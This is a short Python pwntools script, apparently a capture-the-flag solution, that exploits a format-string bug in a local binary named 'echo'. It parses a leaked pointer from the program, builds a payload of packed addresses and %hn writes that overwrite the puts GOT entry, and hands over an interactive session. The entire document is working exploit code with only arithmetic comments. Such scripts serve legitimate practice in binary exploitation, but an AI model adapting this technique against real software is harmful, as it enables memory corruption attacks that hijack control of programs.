from pwn import *
context.log_level = 'debug'

conn = process("./echo")

conn.recvuntil('&id = ')
receive = conn.recvline()
receive = receive[2:-1]

id_ptr = int(receive,16) # bd8c 48524
id_ptr_2 = id_ptr + 2 # 8ce5 36069

puts_got = 0x0804c06c  # 0804 2052
puts_got_2 = puts_got + 2 # 9260 37472

# payload = p32(puts_got_2) + p32(puts_got) + p32(id_ptr) + p32(id_ptr_2) + b"%2036x" + b"%7$hn"  + b"%35420x" + b"%8$hn"
payload = p32(puts_got_2) + p32(puts_got) + p32(id_ptr) + p32(id_ptr_2) + b"%2036x" + b"%7$hn"  + b"%34017x" + b"%9$hn" + b"%1403x" + b"%8$hn"+b"%11052x"+b"%10$hn"


conn.recvuntil('...\n')
conn.sendline(payload)
# conn.recvline() 
conn.interactive()